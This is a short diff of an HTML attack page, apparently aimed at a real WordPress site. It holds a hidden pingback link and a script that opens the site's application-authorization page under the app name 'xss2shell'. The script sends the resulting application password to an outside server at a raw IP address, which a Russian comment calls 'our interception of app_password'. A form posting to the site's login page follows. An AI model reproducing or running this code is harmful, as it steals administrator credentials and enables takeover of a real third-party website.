@@ -5,8 +5,8 @@
 <!-- pingback-валидация: ссылка на целевой пост ukrmir -->
 <a href="http://ukrmir.com.ua/coronavirus-disease-2019-2.htm" style="display:none">post</a>
 <script>
-var success = 'https://z36raz36-wq.github.io/webfont-resolver-cdn/cb?';
-var AUTH = 'https://ukrmir.com.ua/wp-admin/authorize-application.php?app_name=xss2shell&app_id=64638&success_url=' + encodeURIComponent(success);
+// success_url — наш перехват app_password (уплотка simplenet → наш HTTP-сервер)
+var AUTH = 'https://ukrmir.com.ua/wp-admin/authorize-application.php?app_name=xss2shell&app_id=64638_ua&success_url=' + encodeURIComponent('http://193.228.2.2:8080/cb');
 window.open(AUTH, '_blank');
 </script>
 <form id="poc" method="post" action="https://ukrmir.com.ua/wp-login.php">
